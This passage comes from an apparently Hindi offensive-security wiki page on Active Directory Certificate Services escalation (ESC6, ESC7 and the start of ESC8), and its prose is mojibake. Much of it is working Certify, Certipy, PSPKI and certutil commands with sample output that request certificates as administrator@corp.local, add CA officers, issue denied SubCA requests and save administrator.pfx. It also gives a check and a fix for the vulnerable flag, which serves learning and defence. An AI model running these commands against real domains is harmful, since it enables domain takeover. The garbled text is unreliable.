рд╣реИрдВред" рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдореЗрдВ рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ) рдФрд░ рд╣рдореЗрдВ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╣рдо рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕рдХреНрд░рд┐рдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ / рдорд╢реАрди рдХреЗ рд░реВрдк рдореЗрдВ)ред

**рдиреЛрдЯ**: рдпрд╣рд╛рдВ рд╡реИрдХрд▓реНрдкрд┐рдХ рдирд╛рдо рд╕реАрдПрд╕рдЖрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `-attrib "SAN:"` рддрд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реАрдПрд╕рдЖрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ (рдпрд╛рдиреА, "рдирд╛рдо рдорд╛рди рдЬреЛрдбрд╝реА")ред рдпрд╣ ESC1 рдореЗрдВ SAN рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐ рд╕реЗ рдЕрд▓рдЧ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡рд┐рд╕реНрддрд╛рд░ рдХреЗ рдмрдЬрд╛рдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЧреБрдгрд╡рддреНрддрд╛ рдореЗрдВ рдЦрд╛рддрд╛ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред

### рджреБрд░реБрдкрдпреЛрдЧ

рд╕рдВрдЧрдарди рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд `certutil.exe` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕реЗрдЯрд┐рдВрдЧ рд╕рдХреНрд╖рдо рд╣реИ:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
рдиреАрдЪреЗ, рдпрд╣ рдХреЗрд╡рд▓ **рджреВрд░рд╕реНрде** **рд░рдЬрд┐рд╕реНрдЯреНрд░реА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рднреА рдХрд╛рдо рдХрд░ рд╕рдХрддреА рд╣реИ:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) рдФрд░ [**Certipy**](https://github.com/ly4k/Certipy) рднреА рдЗрд╕реЗ рдЬрд╛рдВрдЪрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд┐рд╕реА рднреА рд╕рд┐рд╕реНрдЯрдо рд╕реЗ **рд╕реЗрдЯ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдорд╛рди рд▓реЗрдВ **рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ** (рдпрд╛ рд╕рдордХрдХреНрд╖) рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдВред
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдЗрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ рдкрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рдзреНрд╡рдЬ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
рдордИ 2022 рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдмрд╛рдж, рдирдП **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдореЗрдВ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рд╣реЛрдЧрд╛ рдЬреЛ **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреА `objectSid` рдЧреБрдгрдзрд░реНрдо** рдХреЛ **рдПрдореНрдмреЗрдб** рдХрд░реЗрдЧрд╛ред ESC1 рдХреЗ рд▓рд┐рдП, рдпрд╣ рдЧреБрдгрдзрд░реНрдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП SAN рд╕реЗ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди **ESC6** рдХреЗ рд╕рд╛рде, рдпрд╣ рдЧреБрдгрдзрд░реНрдо рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреА `objectSid` рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛, рдФрд░ SAN рд╕реЗ рдирд╣реАрдВред\
рдЗрд╕ рдкреНрд░рдХрд╛рд░, **ESC6 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**, рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ **ESC10 рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрдХреНрд░рдорд┐рдд** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ), рдЬрд╣рд╛рдВ рдирдИ рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдмрдЬрд╛рдп SAN рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреА рдЬрд╛рддреА рд╣реИред
{% endhint %}

## рд╕рдВрдХреНрд░рдорд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг - ESC7

### рд╣рдорд▓рд╛ 1

#### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЦреБрдж рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди **CA рдХреНрд░рд┐рдпрд╛рдПрдВ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХрд╛ рдПрдХ **рд╕реЗрдЯ** рд╣реЛрддрд╛ рд╣реИред рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ `certsrv.msc` рд╕реЗ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, CA рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдЧреБрдгрд╡рддреНрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЯреИрдм рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░рдХреЗ:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕реЗ [**PSPKI рдХреЗ рдореЙрдбреНрдпреВрд▓**](https://www.pkisolutions.com/tools/pspki/) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, `Get-CertificationAuthority | Get-CertificationAuthorityAcl` рдХреЗ рд╕рд╛рде:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
рдпрд╣рд╛рдБ рджреЛ рдореБрдЦреНрдп рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ, рдЬреЛ "CA рдкреНрд░рд╢рд╛рд╕рдХ" рдФрд░ "рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рдмрдВрдзрдХ" рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВред

#### рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкрд░ "ManageCA" рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ рдореБрдЦреНрдп рд╣реИ, рддреЛ рд╣рдо **PSPKI** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** рдмрд┐рдЯ рдХреЛ рдлреНрд▓рд┐рдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ **SAN рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг** рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗ ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕реЗ [**PSPKI рдХреЗ Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд░рд▓ рд░реВрдк рдореЗрдВ рднреА рд╕рдВрднрд╡ рд╣реИред

**`ManageCertificates`** рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдПрдХ рд▓рдВрдмрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдордВрдЬреВрд░реА рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**, рдЗрд╕рд▓рд┐рдП "CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рдмрдВрдзрдХ рдордВрдЬреВрд░реА" рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИред

рдЖрдк **Certify** рдФрд░ **PSPKI** рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдПрдХ рд╕рдВрдпреЛрдЬрди рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдордВрдЬреВрд░реА рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### рд╣рдорд▓рд╛ 2

#### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

{% hint style="warning" %}
рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ рдореЗрдВ, **`Manage CA`** рдЕрдиреБрдорддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **EDITF\_ATTRIBUTESUBJECTALTNAME2** рдлрд╝реНрд▓реИрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **ESC6 рд╣рдорд▓рд╛** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдЬрдм рддрдХ CA рд╕реЗрд╡рд╛ (`CertSvc`) рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ `Manage CA` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХрд╛ рдЕрд░реНрде рдпрд╣ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдХреЛ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдмрд╣реБрдд рд╕реЗ рдкреИрдЪ рдХрд┐рдП рдЧрдП рдкрд░реНрдпрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдордИ 2022 рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдХрд╛рд░рдг ESC6 рдареАрдХ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдпрд╣рд╛рдВ рдПрдХ рдФрд░ рд╣рдорд▓рд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдВ:

* рдХреЗрд╡рд▓ **`ManageCA` рдЕрдиреБрдорддрд┐**
* **`Manage Certificates`** рдЕрдиреБрдорддрд┐ (рдпрд╣ **`ManageCA`** рд╕реЗ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **`SubCA`** рдХреЛ **рд╕рдХреНрд╖рдо** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЗрд╕реЗ **`ManageCA`** рд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)

рдпрд╣ рддрдХрдиреАрдХ рдЙрд╕ рддрдереНрдп рдкрд░ рдЖрд╢реНрд░рд┐рдд рд╣реИ рдХрд┐ `Manage CA` рдФрд░ `Manage Certificates` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд╡рд┐рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз** рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **`SubCA`** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **ESC1 рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд** рд╣реИ, рд▓реЗрдХрд┐рди **рдХреЗрд╡рд▓ рдкреНрд░рд╢рд╛рд╕рдХ** рд╣реА рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЬреЛ **рдЕрд╕реНрд╡реАрдХрд╛рд░рд┐рдд** рд╣реЛрдЧрд╛ - рд▓реЗрдХрд┐рди **рдлрд┐рд░ рдкреНрд░рдмрдВрдзрдХ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

#### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдирдП рдЕрдзрд┐рдХрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рдХрд░ рдЦреБрдж рдХреЛ **`Manage Certificates` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрд╛рд░** рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ `-enable-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рд╕реАрдП рдкрд░ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `SubCA` рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
рдпрджрд┐ рд╣рдордиреЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдВ рдкреВрд░реА рдХреА рд╣реИрдВ, рддреЛ рд╣рдо **`SubCA` рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

**рдпрд╣ рдЕрдиреБрд░реЛрдз рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**, рд▓реЗрдХрд┐рди рд╣рдо рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рд╕рд╣реЗрдЬреЗрдВрдЧреЗ рдФрд░ рдЕрдиреБрд░реЛрдз рдЖрдИрдбреА рдХреЛ рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
рдЕрдкрдиреЗ **`Manage CA` рдФрд░ `Manage Certificates`** рдХреЗ рд╕рд╛рде, рд╣рдо рдлрд┐рд░ `ca` рдХрдорд╛рдВрдб рдФрд░ `-issue-request <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рд╡рд┐рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
рдФрд░ рдЕрдВрдд рдореЗрдВ, рд╣рдо `req` рдХрдорд╛рдВрдб рдФрд░ `-retrieve <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рдЬрд╛рд░реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay рд╕реЗ AD CS HTTP рдЕрдВрдд-рдмрд┐рдВрджреБрдУрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдирд╛ - ESC8

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

{% hint style="info" %}
рд╕рд╛рд░рд╛рдВрд╢ рдореЗрдВ, рдпрджрд┐ рдХрд┐рд╕реА рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ **AD CS рд╕реНрдерд╛рдкрд┐рдд рд╣реИ**, рд╕рд╛рде рд╣реА рдПрдХ **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдЕрдВрдд-рдмрд┐рдВрджреБ** рдФрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реИ** рдЬреЛ **рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдорд╛рдВрдХрди рдФрд░ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **`Machine`** рдЯреЗрдореНрдкрд▓реЗрдЯ), рддреЛ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реЛ**!
{% endhint %}

AD CS рдХрдИ **HTTP рдЖрдзрд╛рд░рд┐рдд рдирд╛рдорд╛рдВрдХрди рд╡рд┐рдзрд┐рдпреЛрдВ** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ HTTP рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╕рднреА **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ** рдХреЛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред NTLM рд░рд┐рд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рд╕рдВрдХреНрд░рдорд┐рдд рдорд╢реАрди рдкрд░ рдХрд┐рд╕реА рднреА рдЗрдирдмрд╛рдЙрдВрдб-NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг AD рдЦрд╛рддреЗ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдкреАрдбрд╝рд┐рдд рдЦрд╛рддрд╛ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реБрдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрди рд╡реЗрдм рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **`User` рдпрд╛ `Machine` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

